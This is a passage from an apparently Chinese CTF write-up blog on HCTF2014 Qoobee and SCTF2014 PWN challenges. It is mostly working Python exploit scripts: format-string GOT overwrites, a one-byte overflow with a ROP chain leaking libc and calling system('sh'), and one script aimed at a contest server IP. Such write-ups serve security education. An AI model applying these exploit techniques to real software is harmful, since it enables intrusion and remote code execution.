class="line">        io.read_until(<span class="string">'number(0-100)? '</span>)</div><div class="line">        io.writeline(<span class="string">'0'</span>)</div><div class="line">        io.read_until(<span class="string">'Your Choice: '</span>)</div><div class="line">        io.writeline(<span class="string">'7'</span>)</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> rightset:</div><div class="line">            log(i)</div><div class="line">            log(right_dic\[i\])</div><div class="line">            io.read_until(<span class="string">'Select one:'</span>)</div><div class="line">            io.writeline(right_dic\[i\])</div><div class="line">        io.writeline(<span class="string">'scissor'</span>)</div><div class="line">        io.read_until(<span class="string">'number(0-100)?'</span>)</div><div class="line">        io.writeline(<span class="string">'0'</span>)</div><div class="line">        buf = io.read_until(<span class="string">'n'</span>)</div><div class="line">        divnum = int(pattern.findall(buf)\[<span class="number">0</span>\])</div><div class="line">        log(<span class="string">'divnum:%d'</span> % divnum)</div><div class="line">    <span class="keyword">elif</span> <span class="string">'scissor'</span> <span class="keyword">in</span> buf:</div><div class="line">        log(<span class="string">'win'</span>)</div><div class="line">        modnum = <span class="number">2</span></div><div class="line">        <span class="keyword">if</span> len(rightset)==<span class="number">31</span>:</div><div class="line">            <span class="keyword">return</span> <span class="string">'$'</span></div><div class="line">        io.read_until(<span class="string">'Select one: '</span>)</div><div class="line">        io.writeline(<span class="string">'1234'</span>)</div><div class="line">        io.read_until(<span class="string">'number(0-100)? '</span>)</div><div class="line">        io.writeline(<span class="string">'0'</span>)</div><div class="line">        io.read_until(<span class="string">'Your Choice: '</span>)</div><div class="line">        io.writeline(<span class="string">'7'</span>)</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> rightset:</div><div class="line">            log(i)</div><div class="line">            log(right_dic\[i\])</div><div class="line">            io.read_until(<span class="string">'Select one:'</span>)</div><div class="line">            io.writeline(right_dic\[i\])</div><div class="line">        io.writeline(<span class="string">'paper'</span>)</div><div class="line">        io.read_until(<span class="string">'number(0-100)?'</span>)</div><div class="line">        io.writeline(<span class="string">'0'</span>)</div><div class="line">        buf = io.read_until(<span class="string">'n'</span>)</div><div class="line">        divnum = int(pattern.findall(buf)\[<span class="number">0</span>\])</div><div class="line">        log(<span class="string">'divnum:%d'</span> % divnum)</div><div class="line">    r = divnum*<span class="number">3</span> + modnum</div><div class="line">    log (<span class="string">"char is %d,'%c'"</span> % (r,chr(r)))</div><div class="line">    rightset.append(modnum)</div><div class="line">    log(<span class="string">'out checkround'</span>)</div><div class="line">    <span class="keyword">return</span> chr(r)</div><div class="line">\<span class="comment">#     testdiv(modnum)</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">p7</span><span class="params">()</span>:</span></div><div class="line">\<span class="comment">#     io.read_until('Your Choice: ')</span></div><div class="line">\<span class="comment">#     io.writeline('1')</span></div><div class="line">\<span class="comment">#     io.read_until('QooBee Name: ')</span></div><div class="line">\<span class="comment">#     io.writeline('1')</span></div><div class="line">\<span class="comment">#     io.read_until('QooBee Age: ')</span></div><div class="line">\<span class="comment">#     io.writeline('1')</span></div><div class="line">\<span class="comment">#     io.read_until('Description(30 bytes): ')</span></div><div class="line">\<span class="comment">#     io.writeline('1')</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        round()</div><div class="line">    <span class="keyword">except</span> TIMEOUT:</div><div class="line">        <span class="keyword">print</span> flag</div><div class="line">\<span class="comment">#     print 'end'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    reg=re.compile(<span class="string">r'have (d+) donuts'</span>)</div><div class="line">    reg_level=re.compile(<span class="string">r'Exp: d+/(d+)'</span>)</div><div class="line">    time1 = time.time()</div><div class="line">\<span class="comment">#     io = zio('./qoobee4')</span></div><div class="line">    io.read_until(<span class="string">'Choice:'</span>)</div><div class="line">    io.writeline(<span class="string">'1'</span>)</div><div class="line">    io.read_until(<span class="string">'Name:'</span>)</div><div class="line">    io.writeline(<span class="string">'1'</span>)</div><div class="line">    io.read_until(<span class="string">'Age:'</span>)</div><div class="line">    io.writeline(<span class="string">'1'</span>)</div><div class="line">    io.read_until(<span class="string">'(30 bytes):'</span>)</div><div class="line">    io.writeline(<span class="string">'%8888u%8888u%4u%4u%4u%4u%n'</span>)</div><div class="line">    total=<span class="number">0</span></div><div class="line">    Level=<span class="number">0</span></div><div class="line">    io.read_until(<span class="string">'Choice:'</span>)</div><div class="line">    <span class="keyword">while</span> Level&lt;<span class="number">49</span>:</div><div class="line">        <span class="keyword">while</span> total&lt;<span class="number">1000</span>:</div><div class="line">            io.writeline(<span class="string">'3'</span>)</div><div class="line">            r = io.read_until(<span class="string">'?'</span>)</div><div class="line">            ind = r.index(<span class="string">'Amount'</span>)</div><div class="line">            Amount = int(r\[ind+<span class="number">6</span>:ind+<span class="number">8</span>\])</div><div class="line">            io.writeline(str(Amount))</div><div class="line">            total+=Amount</div><div class="line">            r = io.read_until(<span class="string">'Choice:'</span>)</div><div class="line">            <span class="keyword">if</span> <span class="string">'Sorry'</span> <span class="keyword">in</span> r:</div><div class="line">                total-=Amount</div><div class="line">                io.writeline(<span class="string">'2'</span>)</div><div class="line">                io.read_until(<span class="string">'Choice:'</span>)</div><div class="line">        <span class="keyword">while</span> total&gt;<span class="number">0</span>:</div><div class="line">            <span class="keyword">if</span> len(reg\_level.findall(r))&gt;<span class="number">0</span> <span class="keyword">and</span> <span class="number">500</span> == int(reg\_level.findall(r)\[<span class="number">0</span>\]):</div><div class="line">                <span class="keyword">print</span> reg_level.findall(r)</div><div class="line">                Level=<span class="number">49</span></div><div class="line">                <span class="keyword">break</span></div><div class="line">            io.writeline(<span class="string">'4'</span>)</div><div class="line">            r = io.read_until(<span class="string">'?'</span>)</div><div class="line">            have=int(reg.findall(r)\[<span class="number">0</span>\])</div><div class="line">            <span class="keyword">if</span> have&gt;=<span class="number">9</span>:</div><div class="line">                have = <span class="number">9</span></div><div class="line">            total-=have</div><div class="line">            io.writeline(str(have))</div><div class="line">    time2=time.time()</div><div class="line">    <span class="keyword">print</span> time2-time1</div><div class="line">    p7()</div><div class="line">    f = open(<span class="string">'flagset'</span>,<span class="string">'a'</span>)</div><div class="line">    f.write(flag+<span class="string">' '</span>+time.strftime(<span class="string">'%H:%M:%S'</span>,time.localtime(time.time()))+<span class="string">'n'</span>)</div><div class="line">    f.close()</div><div class="line">    <span class="keyword">print</span> <span class="string">'thread over with flag:%s'</span> % flag</div><div class="line"></div><div class="line"><span class="keyword">if</span> \_\_name\_\_ == <span class="string">'\_\_main\_\_'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h1 id="Qoobee6"><a href="#Qoobee6" class="headerlink" title="Qoobee6"></a>Qoobee6</h1><h2 id="利用分析-5"><a href="#利用分析-5" class="headerlink" title="利用分析"></a>利用分析</h2><p>printf可以对age指定的任意地址写入</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> \_\_cdecl fun2\_sub_80497A8(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v2; <span class="comment">// ecx@2</span></div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@4</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// \[sp+1Ch\] \[bp-Ch\]@1</span></div><div class="line"></div><div class="line">  v4 = *MK\_FP(\_\_GS__, <span class="number">20</span>);</div><div class="line">  <span class="keyword">if</span> ( a1 )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"nYour QooBee Dragon Info:"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Name: %sn"</span>, a1 + <span class="number">20</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Age: %dn"</span>, *(_DWORD *)(a1 + <span class="number">32</span>));</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Description: "</span>);</div><div class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)(a1 + <span class="number">36</span>));            <span class="comment">// format string, write \[age dword\]</span></div><div class="line">                                                <span class="comment">// nerver patched</span></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Level: %dnMoney: $%dn"</span>, *(\_BYTE *)(a1 + <span class="number">8</span>), *(\_DWORD *)a1);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Donuts: %dn"</span>, *(_DWORD *)(a1 + <span class="number">4</span>));</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Exp: %d/%dn"</span>, *(_DWORD *)(a1 + <span class="number">12</span>), a2);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Vit: %d/%dn"</span>, *(_DWORD *)(a1 + <span class="number">16</span>), <span class="number">0x1F4</span>u);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"You need adopt a QooBee Dragon first!"</span>);</div><div class="line">  &#125;</div><div class="line">  result = *MK\_FP(\_\_GS__, <span class="number">20</span>) ^ v4;</div><div class="line">  <span class="keyword">if</span> ( *MK\_FP(\_\_GS__, <span class="number">20</span>) != v4 )</div><div class="line">    \_\_stack\_chk_fail(v2);</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>读plt获得printf函数的地址 通过给定libc.so偏移获取system地址 将system替换plt的mmap函数</p>
<h2 id="利用代码-5"><a href="#利用代码-5" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line"><span class="string">'''</span></div><div class="line">printf format string attack</div><div class="line">not patched</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line">io = zio(<span class="string">'./qoobee'</span>,timeout=<span class="number">8000000</span>,print_write=COLORED(REPR))</div><div class="line"></div><div class="line">\<span class="comment"># replaced function</span></div><div class="line">printf\_got\_plt = <span class="number">0x0804B74C</span></div><div class="line">mmap\_got\_plt = <span class="number">0x0804B77C</span></div><div class="line"></div><div class="line">\<span class="comment"># in my system</span></div><div class="line">\<span class="comment"># printf      0x0004d1f0</span></div><div class="line">\<span class="comment"># system  0x00040100</span></div><div class="line">offset\_printf\_system = <span class="number">-0xd0f0</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_dword</span><span class="params">(addr)</span>:</span></div><div class="line">    io.writeline(<span class="string">'1'</span>)</div><div class="line">    io.writeline(<span class="string">'1'</span>)</div><div class="line">    io.writeline(str(addr))</div><div class="line">    io.writeline(<span class="string">'%.4s'</span>)</div><div class="line">    io.writeline(<span class="string">'2'</span>)</div><div class="line">    io.read_until(<span class="string">'Description: '</span>)</div><div class="line">    plt = io.read(<span class="number">4</span>)</div><div class="line">    log(<span class="string">'addr %08x:%s'</span> % (addr,hex(struct.unpack(<span class="string">'&lt;I'</span>, plt)\[<span class="number">0</span>\])), color=<span class="string">'red'</span>)</div><div class="line">    <span class="keyword">return</span> plt</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>\<span class="title">_printf</span>\<span class="title">_addr</span><span class="params">()</span>:</span></div><div class="line">    rst = struct.unpack(<span class="string">'&lt;I'</span>,leak\_dword(printf\_got_plt))\[<span class="number">0</span>\]</div><div class="line">    log(<span class="string">'printf_plt:%s'</span> % hex(rst), color=<span class="string">'red'</span>)</div><div class="line">    <span class="keyword">return</span> rst</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_dword</span><span class="params">(addr, dword)</span>:</span></div><div class="line">    <span class="keyword">if</span> dword == <span class="number">0</span>:</div><div class="line">        payload = <span class="string">'%n'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        payload = <span class="string">'%0'</span>+str(dword)+<span class="string">'x'</span>+<span class="string">'%1$n'</span></div><div class="line">    io.writeline(<span class="string">'1'</span>)</div><div class="line">    io.writeline(<span class="string">'1'</span>)</div><div class="line">    io.writeline(str(addr))</div><div class="line">    io.writeline(payload)</div><div class="line">    io.writeline(<span class="string">'2'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> \_\_name\_\_ == <span class="string">'\_\_main\_\_'</span>:</div><div class="line">    io.writeline(<span class="string">'-214'</span>)</div><div class="line">    io.writeline(<span class="string">'sh'</span>)</div><div class="line">    got_plt = <span class="string">""</span></div><div class="line">    printf\_plt = get\_printf_addr()</div><div class="line">    system\_addr = printf\_plt + offset\_printf\_system</div><div class="line">    got\_plt += l32(system\_addr)</div><div class="line">    log(<span class="string">'system\_addr:%s'</span> % hex(system\_addr), color=<span class="string">'red'</span>)</div><div class="line">    io.gdb_hint()</div><div class="line">    i = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> got_plt:</div><div class="line">        log(<span class="string">'set %02x:%u'</span> % (ord(c),struct.unpack(<span class="string">'&lt;B'</span>, c)\[<span class="number">0</span>\]), color=<span class="string">'red'</span>)</div><div class="line">        set\_dword(mmap\_got_plt+i, struct.unpack(<span class="string">'&lt;B'</span>, c)\[<span class="number">0</span>\])</div><div class="line">        i += <span class="number">1</span></div><div class="line">    io.writeline(<span class="string">'-214'</span>)</div><div class="line">    io.interact()</div></pre></td></tr></table></figure>
                    
                        
                    
                    
                        <p>
                            <a href="/writeups/hctf2014final-qoobee-writeup/#post-footer" class="postShorten-excerpt_link link">
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/writeups/sctf2014-pwn-writeups/">
                            SCTF2014之PWN部分writeup
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2014-12-08T16:13:56+08:00">
	
		    Dec 08, 2014
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/writeups/">writeups</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <h1 id="PWN200"><a href="#PWN200" class="headerlink" title="PWN200"></a>PWN200</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">pwn200: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26</div><div class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE</div><div class="line">No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   pwn200</div></pre></td></tr></table></figure>
<p>只启用了NX 接下来分析程序，程序很简单</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">ssize\<span class="keyword">_t</span> \_\_<span class="function">cdecl <span class="title">sub_80484AC</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax@3</span></div><div class="line">  <span class="keyword">char</span> v1; <span class="comment">// \[sp+1Ch\] \[bp-9Ch\]@1</span></div><div class="line">  <span class="keyword">int</span> buf; <span class="comment">// \[sp+9Ch\] \[bp-1Ch\]@1</span></div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// \[sp+A0h\] \[bp-18h\]@1</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// \[sp+A4h\] \[bp-14h\]@1</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// \[sp+A8h\] \[bp-10h\]@1</span></div><div class="line">  <span class="keyword">size_t</span> n; <span class="comment">// \[sp+ACh\] \[bp-Ch\]@1</span></div><div class="line"></div><div class="line">  n = <span class="number">16</span>;</div><div class="line">  buf = <span class="number">0</span>;</div><div class="line">  v3 = <span class="number">0</span>;</div><div class="line">  v4 = <span class="number">0</span>;</div><div class="line">  v5 = <span class="number">0</span>;</div><div class="line">  <span class="built_in">memset</span>(&amp;v1, <span class="number">0</span>, <span class="number">0x80</span>u);</div><div class="line">  write(<span class="number">1</span>, <span class="string">"input name:"</span>, <span class="number">12u</span>);</div><div class="line">  read(<span class="number">0</span>, &amp;buf, n + <span class="number">1</span>);         <span class="comment">//读取17个字符到buf，存在一个字节的溢出，修改n的值</span></div><div class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf) - <span class="number">1</span> &gt; <span class="number">9</span> || <span class="built_in">strncmp</span>(<span class="string">"syclover"</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf, <span class="number">8u</span>) )</div><div class="line">  &#123;</div><div class="line">    result = <span class="number">-1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    write(<span class="number">1</span>, <span class="string">"input slogan:"</span>, <span class="number">14u</span>);</div><div class="line">    read(<span class="number">0</span>, &amp;v1, n);        <span class="comment">//n值被修改后溢出v1</span></div><div class="line">    result = write(<span class="number">1</span>, &amp;v1, n);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>程序在read到buf时多读了一个字符，导致溢出修改n的值，之后read到v1时导致溢出控制程序流程。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>第一步先写入”sycloverx00x00123456xef”，其中xef就是覆盖变量n的字节。 之后程序调用read(0, &amp;v1, n);时就可以读入payload 因为NX，所以采用ROP链执行。 题目提供了glibc.so，所以思路是先读取plt中__libc_start_main的地址，通过提供的glibc.so获取到system和__libc_start_main的偏移差计算出system的位置。</p>
<p>0003f430  w   DF .text 0000008d  GLIBC_2.0   system<br>000193e0 g    DF .text  000001c2  GLIBC_2.0   __libc_start_main</p>
<p>地址偏移为 0x26050 之后将其写入.plt中__libc_start_main的位置。最后通过执行.got中__libc_start_main并置入参数sh来执行system(“sh”)获得shell。 exploit如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="string">'''</span></div><div class="line">SCTF2014 pwn200 exp</div><div class="line">yuf4n</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line">write_got = l32(<span class="number">0x080483A0</span>)</div><div class="line">read_got = l32(<span class="number">0x08048360</span>)</div><div class="line">lib\_main\_got = l32(<span class="number">0x08048390</span>)</div><div class="line">lib\_main\_plt = l32(<span class="number">0x0804985C</span>)</div><div class="line">ppppr = l32(<span class="number">0x08048645</span>)</div><div class="line">pppr = l32(<span class="number">0x08048646</span>)</div><div class="line">ppr = l32(<span class="number">0x080485bf</span>)</div><div class="line"></div><div class="line">\<span class="comment"># io = zio('./pwn200',print_write=COLORED(REPR))</span></div><div class="line">io = zio((<span class="string">'218.2.197.248'</span>,<span class="number">10001</span>),print_write=COLORED(REPR))</div><div class="line"></div><div class="line">payload0 = <span class="string">''</span></div><div class="line">payload0 += <span class="string">'sycloverx00x00123456'</span>+<span class="string">'xef'</span> <span class="comment"># second write len</span></div><div class="line"></div><div class="line">payload1 = <span class="string">''</span></div><div class="line">\<span class="comment"># second write</span></div><div class="line">\<span class="comment"># junk</span></div><div class="line">payload1 += <span class="string">'1'</span> * <span class="number">0x9c</span></div><div class="line">\<span class="comment"># ebp</span></div><div class="line">payload1 += <span class="string">'2345'</span></div><div class="line">\<span class="comment"># eip call write</span></div><div class="line">payload1 += write_got</div><div class="line">\<span class="comment"># pppr</span></div><div class="line">payload1 += pppr</div><div class="line">\<span class="comment"># write args</span></div><div class="line">payload1 += l32(<span class="number">0x1</span>)</div><div class="line">payload1 += lib\_main\_plt</div><div class="line">payload1 += l32(<span class="number">0x04</span>)</div><div class="line"></div><div class="line">\<span class="comment"># read modify libmainplt</span></div><div class="line">payload1 += read_got</div><div class="line">\<span class="comment"># pppr</span></div><div class="line">payload1 += pppr</div><div class="line">\<span class="comment"># args</span></div><div class="line">payload1 += l32(<span class="number">0x0</span>)</div><div class="line">payload1 += lib\_main\_plt</div><div class="line">payload1 += l32(<span class="number">0x08</span>) </div><div class="line"></div><div class="line">\<span class="comment"># lib_main(system)</span></div><div class="line">payload1 += lib\_main\_got</div><div class="line">payload1 += <span class="string">'1111'</span></div><div class="line">payload1 += l32(<span class="number">0x0804985C</span>+<span class="number">0x4</span>)</div><div class="line">\<span class="comment"># print len(payload1)</span></div><div class="line"></div><div class="line">io.read_until(<span class="string">'input name:'</span>)</div><div class="line">io.write(payload0)</div><div class="line">io.read_until(<span class="string">'input slogan:'</span>)</div><div class="line">io.write(payload1)</div><div class="line"></div><div class="line">buf = io.sock.recv(<span class="number">1024</span>)</div><div class="line">lib\_main\_add = struct.unpack(<span class="string">'&lt;I'</span>,buf\[<span class="number">-4</span>:\])\[<span class="number">0</span>\]</div><div class="line">system\_add = lib\_main_add + <span class="number">0x26050</span></div><div class="line"><span class="keyword">print</span> hex(lib\_main\_add)</div><div class="line">\<span class="comment"># io.gdb_hint()</span></div><div class="line">payload2 = l32(system_add)</div><div class="line">payload2 += <span class="string">'shx00x00'</span></div><div class="line"></div><div class="line">io.write(payload2+<span class="string">'n'</span>)</div><div class="line">io.interact()</div></pre></td></tr></table></figure>
<p>flag SCTF{SH3NG_4_KAN_DAN__BU_FU_9_GANN}</p>
<h1 id="PWN300"><a href="#PWN300" class="headerlink" title="PWN300"></a>PWN300</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">pwn300: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24</div><div class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE</div><div class="line">No RELRO        Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   pwn300</div></pre></td></tr></table></figure>
<p>题目也提供了glibc，而且pwn200进去以后发现三题都在一个服务器上。所以目测利用方法应该相似。</p>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在第三个功能显示message发现一个格式化溢出漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> \_\_cdecl fun3\_sub_80487FA()</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@1</span></div><div class="line">  <span class="keyword">char</span> dest; <span class="comment">// \[sp+1Ch\] \[bp-40Ch\]@1</span></div><div class="line">  <span class="keyword">int</span> v2; <span class="comment">// \[sp+41Ch\] \[bp-Ch\]@1</span></div><div class="line"></div><div class="line">  v2 = *MK\_FP(\_\_GS__, <span class="number">20</span>);</div><div class="line">  <span class="built_in">strcpy</span>(&amp;dest, src);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Your message is:"</span>);</div><div class="line">  <span class="built_in">printf</span>(src);                                  <span class="comment">// exploit</span></div><div class="line">  result = *MK\_FP(\_\_GS__, <span class="number">20</span>) ^ v2;</div><div class="line">  <span class="keyword">if</span> ( *MK\_FP(\_\_GS__, <span class="number">20</span>) != v2 )</div><div class="line">    \_\_stack\_chk_fail();</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>而且之前还很配合的把src的内容复制到栈里。。。这样就有机会对任意地址进行修改</p>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用格式化溢出漏洞可以对内存读取写入，所以可以利用pwn200的利用方式：读取PLT中__libc_main_start的地址，通过libc.so计算system的地址写入程序之后可能会用到的函数的GOT 通过调试发现输入buf的起点位于printf调用的第七个变量 读取.plt __libc_main_start的payload ‘x28x91x04x08%7$sn’ 接下来找一个接下来可能调用到的函数修改其PLT为system函数的地址。这个函数最好可以把“sh”作为参数放进去。于是我选择了memset函数 他在第二个功能中被用到，而且正好把src当参数调用，这样我们通过留言功能让src为”sh”就能调用system(“sh”)了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> \_\_cdecl fun2\_sub_80487B6()</div><div class="line">&#123;</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"input your message"</span>);</div><div class="line">  <span class="built_in">memset</span>(src, <span class="number">0</span>, <span class="number">0x400</span>u);</div><div class="line">  <span class="keyword">return</span> readbuf\_sub\_804866D((<span class="keyword">int</span>)src, <span class="number">1024</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>下面是exploit，修改地址的时候利用了libformatstr库</p>
